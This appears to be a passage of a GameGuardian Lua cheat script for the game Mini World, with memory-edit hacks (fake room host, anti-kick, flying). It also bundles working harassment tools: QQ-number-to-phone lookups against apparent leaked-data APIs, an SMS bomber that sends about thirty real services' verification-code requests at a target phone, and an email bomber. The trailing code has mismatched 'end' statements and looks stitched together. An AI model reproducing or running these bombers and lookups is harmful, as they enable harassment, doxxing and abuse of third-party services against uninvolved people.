	 gg.editAll("25", gg.TYPE_DOUBLE)
	 gg.toast("爱上对方过后就哭了")
	 gg.clearResults()
end

function c11()
b31a= gg.prompt({"输入房主迷你号"},{[1]=0},{[1]="number"})[1]
qmnb = {
{["memory"] = 4},
{["name"] = "伪房主"},
{["value"] = b31a, ["type"] = 4},
{["lv"] = 2, ["offset"] = 44, ["type"] = 4},
}
qmxg = {
{["value"] = 3, ["offset"] = 44, ["type"] = 4},
}
xqmnb(qmnb)
gg.clearResults()
end

function c12()
b= gg.prompt({"输入房主迷你号"},{[1]=1063435366},{[1]="number"})[1]
qmnb = {
{["memory"] = 4},
{["name"] = "防踢"},
{["value"] = b, ["type"] = 4},
{["lv"] = 2, ["offset"] = 44, ["type"] = 4},
}
qmxg = {
{["value"] = 3, ["offset"] = 44, ["type"] = 4},
{["value"] = 16777472, ["offset"] = -32, ["type"] = 4},
{["value"] = 16777216, ["offset"] = -32, ["type"] = 4},
}
xqmnb(qmnb)
gg.clearResults()
end



function QQSB1()
    local musu=gg.prompt({"🎃输入QQ号即可查询🌕","🌚网址1","🌝网址2(即将关闭)"
    },{
      [1]="",
      [2]=true,
      [3]=false
    },{
      "text",
      "checkbox",
      "checkbox"
    })
    if not musu then
      return nil
     else
      if musu[2]==true and musu[3]==true then
        gg.alert('⭐️两个网址，只能选择一个')
        return nil
      end
      if musu[2]==true then
        gg.toast("💫查询ing...",false)
        local xg=gg.makeRequest("http://yc52.net/qb-api.php?mod=cha&qq="..musu[1]).content
        if not xg then
          gg.alert('☀️你已拒绝网络申请，查询失败☀️')
          return
        end
        local jg=xg:match('mobile": "(.-)"')
        local qq=xg:match('"qq": "(.-)"')
        if jg==nil then
          gg.alert('🔥未查询到…库中并没有这个记录❄️','💨确定🌬')
          return nil
        end
        local yue=gg.alert('💦ＱＱ号:'..qq..'\n\n💦手机号:'..jg,'🌊复制','🌪取消')
        if yue==1 then
          gg.copyText('[ＱＱ号]:'..qq..' \n[手机号]:'..jg,false)
        end
        if yue==2 then
          return nil
        end
      end
    end
    if musu[3]==true then
      gg.toast("💧查询ing...",false)
      local xg2=gg.makeRequest("http://cxx.yun7.me/qqcx?qq="..musu[1]).content
      if not xg2 then
        gg.alert('🍎你已拒绝网络申请，查询失败🍊')
        return
      end
      --    status":200,"message":"查询成功","phone":"669","phonediqu":"河北保定 移动","lol":"没有找到","wb":"6134218","qqlm":"没有找到"}

      local jg2=xg2:match('phone":"(.-)"')--手机号
      local qq1=xg2:match('phonediqu":"(.-)"')--号码归属地
      local qq2=xg2:match('lol":"(.-)"')--LOL信息
      local qq3=xg2:match('wb":"(.-)"')--微博信息
      if jg2==nil then
        gg.alert('🥝未查询到…库中并没有这个记录🍌','🍇确定🍇')
        return nil
      end
      local yue=gg.alert('🥒ＱＱ号:'..musu[1]..'\n\n🌽手机号:'..jg2..'\n\n🥜号码归属地:'..qq1..'\n\n🍞LOL信息:'..qq2..'\n\n🍳微博UID'..qq3,'🍟复制','🥙取消')
      if yue==1 then
        gg.copyText('ＱＱ号:'..musu[1]..' \n 手机号:'..jg2..'  \n号码归属地:'..qq1..' \n LOL信息:'..qq2..'  \n微博UID:'..qq3,false)
      end
      if yue==2 then
        return nil
      end
    end
end

function QQSB2()
    local musu=gg.prompt({"🍭输入手机号即可反查🍭"
    },{
      [1]=""
    },{
      "text"
    })
    if not musu then
      return nil
     else
      gg.toast("🍬查询ing...",false)
      local xg=gg.makeRequest("http://cxx.yun7.me/qqxc?phone="..musu[1]).content
      if not xg then
        gg.alert('🍼你已拒绝网络申请，查询失败🥤')
        return
      end
      ---     {"status":200,"message":"查询成功","qq":"(.-)","phonediqu":"(.-)","lol":"(.-)",","qqlm":"没有找到"}
      local jg=xg:match('qq":"(.-)"')--qq号
      local qq=xg:match('phonediqu":"(.-)"')--号码归属地
      local qq1=xg:match('lol":"(.-)"')--LOL信息
      local qq2=xg:match('wb":"(.-)"')--微博
      if jg==nil then
        gg.alert('🥢未查询到…库中并没有这个记录🥡','🥌确定')
        return nil
      end
      local yue=gg.alert('🎿ＱＱ号:'..jg..'\n\n⚾️号码归属地:'..qq..'\n\n⚽️LOL信息:'..qq1..'\n\n🏀微博UID'..qq2,'🏌复制','🏹取消')
      if yue==1 then
        gg.copyText('ＱＱ号:'..jg..' \n 号码归属地:'..qq..' \n LOL信息:'..qq1..' \n微博UID'..qq2,false)
      end
      if yue==2 then
        return nil
      end
    end
end

function QQSB3()
local A=gg.prompt({"💥输入您要轰炸的电话号码💥"},{""},{"text"})
    if not A then
      return nil
     else
local B=A[1]
local C=gg.makeRequest("http://211.156.201.12:8088/youzheng//ems/security?phone="..B.."").content
local C=gg.makeRequest("http://id.ifeng.com/api/simplesendmsg?mobile="..B.."&comefrom=7&auth=&msgtype=0").content
local C=gg.makeRequest("http://srmemberapp.srgow.com/sys/captcha/"..B.."").content
local C=gg.makeRequest("https://m.icbc.com.cn/WapDynamicSite/TouchPage/AppDownResponse.aspx?type=1&app_id=5&mobile_no="..B.."").content
local C=gg.makeRequest("https://kfsbusiness.anjuke.com/weiliaoke/login/sendcode.json?ticket=&cid=&cv=5.6.0&app=i-ajk&udid2=85C1EEA5-6E6A-449B-BD5C-118EA0DFDDBB&phone="..B.."").content
local C=gg.makeRequest("http://api.qingmang.me/v1/account.sendVerification?platform=console&token=&phone=%2B86"..B.."&code=10164337").content
local C=gg.makeRequest("https://api.kqiu.cn/user/v1/sms/code?phoneNumber="..B.."").content
local C=gg.makeRequest("http://prod.layadmin.cn/api/message/sendV2?app_id=1&version=1.4.0&channel_id=001&phone="..B.."").content
local C=gg.makeRequest("http://121.36.193.131/api/v3.1/thirdpartyapi/aliyunmessageapi/SendVerifyMessage?phoneNumber=86"..B.."&type=1").content
local C=gg.makeRequest("https://api.diebian.net/Get/GetVerificationSMS?PhoneNumber="..B.."").content
local C=gg.makeRequest("https://tele.uos123.com/api/orders/orders/sendDxSmsCode?mobile="..B.."").content
local C=gg.makeRequest("https://www.qxueyou.com/v3/learning/uc/login/mobile/captcha?mobilePhone="..B.."&product=qxueyou").content
local C=gg.makeRequest("http://www.gkbbapp.com/Support/JsonNews.aspx?sendShortMessage=yes&Telephone="..B.."").content
local C=gg.makeRequest("https://www.ajia.cn/api/sys/sendCaptchaNoUser?accountName="..B.."").content
local C=gg.makeRequest("https://yi.yshoufa.com/usersystem/site/network/getNetworkPhoneCaptcha?phone="..B.."&networkId=").content
local C=gg.makeRequest("http://dx.zy40.cn/dx/index.php?hm="..B.."").content
local C=gg.makeRequest("http://www.edu-edu.com/cas/web/message/send?phone="..B.."").content
local C=gg.makeRequest("http://id.ifeng.com/api/simplesendmsg?mobile="..B.."").content
local C=gg.makeRequest("http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile="..B.."").content
local C=gg.makeRequest("https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile="..B.."").content
local C=gg.makeRequest("http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile="..B.."&comefrom=7&auth=&msgtype=0").content
local C=gg.makeRequest("https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone="..B.."").content
local C=gg.makeRequest("https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone="..B.."").content
local C=gg.makeRequest("http://api.qingmang.me/v1/account.sendVerification?code=1566478386.8872059778&phone="..B.."").content
local C=gg.makeRequest("http://user.daojia.com/mobile/getcode?mobile="..B.."").content
local C=gg.makeRequest("https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber="..B.."").content
local C=gg.makeRequest("http://slb-sport.vesal.cn/vesal-sport-prod/v1/app/member/getCode?tellAndEmail="..B.."").content
local C=gg.makeRequest("http://cms.51fenmi.com/api/base/public/getCode?mobile="..B.."").content
local C=gg.makeRequest("http://www.52gcc.com/bomb/index.php?hm="..B.."").content
end
end

function QQSB4()
  local Feed=gg.prompt({"✈️收件人地址(邮箱)✈️","🚀邮箱主题🚀","🛸发件内容🛫","🏁轰炸次数🏁"},{"192898257@qq.com","劳资就轰炸你","劳资就轰炸你","1"},{"text","text","text","text"})
  if not Feed then gg.toast("🎢取消发送！🎢",true)
    return nil
  end
  if Feed[1]~="" and Feed[2]~="" and Feed[3]~="" and Feed[4]~="" then
    gg.toast("🗽发送中ing...",true)
    for i=1,Feed[4] do
      xg=gg.makeRequest("https://simpleauth.cn/api/mail/api.php?address="..Feed[1].."&name="..Feed[2]..i.."&certno="..Feed[3]..i).content
    end
    if not xg then
      gg.alert("🕋发送失败！⌚️",'💿确定📀')
    end
    local jg=xg:match('"Code":"(.-)",')
    local jg2=xg:match('msg":"(.-)"')
    if jg =="1" then
      gg.alert(jg2,'🖱确定🖱')
     else
      gg.alert("🔫发送失败！🔫",'🔨确定🔨')
      return nil
    end
   else
    gg.alert("📡填写信息不完整！📡","🔋确定🔋")
    return nil
  end
end

function QQSB5()
sjh=gg.prompt({"💡输入手机号即可查询💡"},{[1]=""},{"number"})
if sjh== nil then gg.toast("🔦取消选择默认初始化🔦")
else
gg.toast("🕯正在查询🕯")
su1=gg.makeRequest("https://www.ip138.com/mobile.asp?mobile="..sjh[1].."&action=mobile").content:match("卡号归属地(.-)邮 编")
dq=su1:match('span>(.-)&')--地区
dq1=su1:match(';(.-)<')--地区2
GSM=su1:match('型(.-)/s'):match("pan>(.-)<")
su2=gg.makeRequest("https://jx.ip138.com/"..sjh[1].."/").content--凶吉
b=su2:match('邮政编码：(.-)</tr>')
yb=b:match('<p>(.-)</p')--邮编
qh=b:match('电话区号：</p></td>(.-)/td>'):match('>(.-)<')--区号
xj=su2:match('red">(.-)href'):match("a>(.-)<")--凶吉
QQ=("手机号:\n"..sjh[1].."\n凶吉:"..xj.."\n"..GSM.."\n定位:\n"..dq..dq1.."\n邮编:"..yb.."\n区号:"..qh)
QQ1=gg.alert(QQ,"💎复制💎","💰返回💰")
if QQ1==0 then Main0() end
if QQ1==1 then gg.copyText(QQ) gg.toast("🛡已复制🛡") end
if QQ1==3 then Main0() end
end
end





function C()
menu1 = gg.choice({
'为什么我的游戏闪退?',
'为什么没有效果?',
'为什么有些功能变成其他功能了?',
'为什么我用改创造2.0闪退?',
'为什么没有效果?',
'为什么有些功能变成其他功能了?',
'返回上一页',
}, nil, "如有错误，请去bbs.madakeji.top建议")

if menu1 == 1 then FK1() end
if menu1 == 2 then FK2() end
if menu1 == 3 then FK3() end
if menu1 == 4 then FK4() end
if menu1 == 5 then FK5() end
if menu1 == 6 then FK6() end
if menu1 == 7 then Main0() end
XGCK=0
end

function FK1()
gg.alert("可能是没有运行守护进程，或者框架问题，还有一部分是game问题，换一下迷你世界就可以了，推荐:4399和小北的跨服迷你")
C()
end

function FK2()
gg.alert("可能是你选的进程不对，请退出看看，或许是本辅助不兼容本迷你世界，请去更换迷你世界")
C()
end
function FK3()
gg.alert("这是BUG，可以去bbs.madakeji.top的CA炸图辅助提意见")
C()
end
function FK4()
gg.alert("因为你未在玩法模式下开启，请去玩法模式开启，如果还闪退，推荐你用1.0")
C()
end

function WXLTNBNB()
qmnb = {
{["memory"] = 4},
{["name"] = "连跳飞天开启"},
{["value"] = 220, ["type"] = 4},
{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
{["lv"] = 120, ["offset"] = 4, ["type"] = 4},
}
qmxg = {
{["value"] = 1, ["offset"] = 128, ["type"] = 4, ["freeze"] = true},
}
xqmnb(qmnb)
end

--[=[
         
 -- []测试
 
 
 --]]
     
]=]
local g = {}
g.file = gg.getFile()
g.sel = nil
gqlb={"请先搜索歌曲",}
idb={"1010"}
SN,gc=1,nil
g.config = gg.getFile():gsub("%lua$", "").."cfg"
function bei()
g.data = loadfile(g.config)
if g.data ~= nil then
g.sel = g.data()
g.data = nil
end
if g.sel == nil then
g.sel = {"亮爽","50"}
end
end
bei()
------
--搜索歌曲
function start(name,sl)
fw=gg.makeRequest("http://music.163.com/api/search/get?s="..name.."&type=1&offset=0&total=true&limit="..sl)
return fw
end
-----
--歌词

--播放音乐
function play(id,name)
gg.toast("正在播放音乐："..name,true)
gg.playMusic("http://music.163.com/song/media/outer/url?id="..id..".mp3")
end
--停止播放
function stop()
gg.toast("正在停止音乐")
for i=1,100 do
gg.playMusic("stop")
gg.playMusic("stop")
gg.playMusic("stop")
end
end
----
function Play(gqlb,idb)
SN = gg.choice(gqlb,nil,ts)
if SN == nil then XGCK =-1 else
sn=gg.choice({"播放"},nil,"歌曲："..gqlb[SN])
if sn == nil then end
if sn == 1 then
play(idb[SN],gqlb[SN])
end
XGCK=-1
end
end
function zjson(jsonr)
local str = jsonr
-- 匹配Json Key的正则表达式
local pattern = "\"[%w]+\":"
string.gsub(str, pattern, function(v)
    if string.find(str, v) then
        str = string.gsub(str, v, string.gsub(v, "\"", ""))
    end
end)
str = string.gsub(str, ":", "=")
str = string.gsub(str, "%[", "{")
str = string.gsub(str, "%]", "}")
local data = "return " .. str
local res = load(data)()
return res
end


function json(con)
res=zjson(con)
zd=res.result.songCount
pd=go3-zd
if pd <= 0 then else go3=zd end
ts="《"..go1.."》找到"..zd.."首歌曲，当前显示"..go3.."首"
gqlb={}
idb={}
for i=1,go3 do
gqlb[i]=res.result.songs[i].name
idb[i]=res.result.songs[i].id
end
--print(idb)
end
function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end 
--主页

function YYLJNB()  SN = gg.choice({
   "搜索歌曲",
   "搜索列表",
   "播放热歌",
   "️停止播放",
   "清除冻结",
   "返回主页️",
},2018,os.date("🌸搜索和播放歌曲。🌸"))
if SN==1 then s1() end
if SN==2 then Play(gqlb,idb) end
if SN==3 then YY998() end
if SN==4 then stop() end
if SN==5 then Main11() end
if SN==6 then Main0() end
XGCK=-7
end

---
function s1()
search = gg.prompt({
"输入要搜索的歌曲\n可加上歌手名字",
"设置显示数量(数字)",
},g.sel,{
"text",
})
if search == nil then Main6() end
gg.saveVariable(search,g.config)
bei()
go1=search[1]
go3=search[2]
jg=start(go1,go3)
if jg.code == 200 then
fh=jg.content
fh=json(fh)
--print(fh)
Play(gqlb,idb)
else
function inspect()
gg.alert("访问网络异常，错误代码：\n\n"..jg.code)
end
if not pcall(inspect) then print("网络异常，请先连接上网络") os.exit() end
end
XGCK=-1
end

---
function s1()
search = gg.prompt({
"输入要搜索的歌曲\n可加上歌手名字",
"设置显示数量(数字)",
},g.sel,{
"text",
})
if search == nil then Main6() end
gg.saveVariable(search,g.config)
bei()
go1=search[1]
go3=search[2]
jg=start(go1,go3)
if jg.code == 200 then
fh=jg.content
fh=json(fh)
--print(fh)
Play(gqlb,idb)
else
function inspect()
gg.alert("访问网络异常，错误代码：\n\n"..jg.code)
end
if not pcall(inspect) then print("网络异常，请先连接上网络") os.exit() end
end
XGCK=-1
end

function Exit()
  print("长风破浪会有时，直挂云帆济沧海。 -［唐］ 李白")
  os.exit()
end
	 

 	 
cs = ''
while(true)do
  if gg.isVisible(true) then
    XGCK=1
    gg.setVisible(false)
  end
  gg.clearResults()
  if XGCK==1 then
    Main0()
  end
end
 	



---[=[   ]=]-------------------------------------------------------------------------------------------------------------------
end

     end

end





if km == nil  then
else
if km ~=""  then
if e==true then
KM_LL(km)
end 
end
end


hak=gg.prompt({
[[全网使用次数：]]..api_total..[[

输入 >1< 解绑卡密
在下方输入你的卡密]],
"是否自动登入",
},{
km,
e
},{
'text',--文字
'checkbox',--多选
})--文本功能



if hak==nil then

elseif hak[2]==true then
io.open(AMI_YDO..'/e.log','w+'):write("2")--写
elseif hak[2]==false then
io.open(AMI_YDO..'/e.log','w+'):write("1")--写
end


if hak==nil then gg.setVisible(false) xxxxxxx=nil
elseif hak[1]== "1" then
G_B=gg.prompt({"输入要解绑的卡密"},{},{"text"})
if  G_B[1]== "" then
gg.alert("空，请填写卡密")--对话框
else
KM_G=json2lua(KM_G(G_B[1]))
if KM_G.code== 200 then
else
gg.alert(KM_G.msg)--对话框
end
end
elseif hak[1]== "2" then

elseif hak[1]== "" then
gg.alert("空，请填写卡密")--对话框
io.open(AMI_YDO..'/e.log','w+'):write("1")--写
else
KM_LL(hak[1])
end

end









while true do
if gg.isVisible(true) then
gg.setVisible(false)
  MIAN()
  else
if xxxxxxx== 999 then
gg.setVisible(true)
else
end
end



end
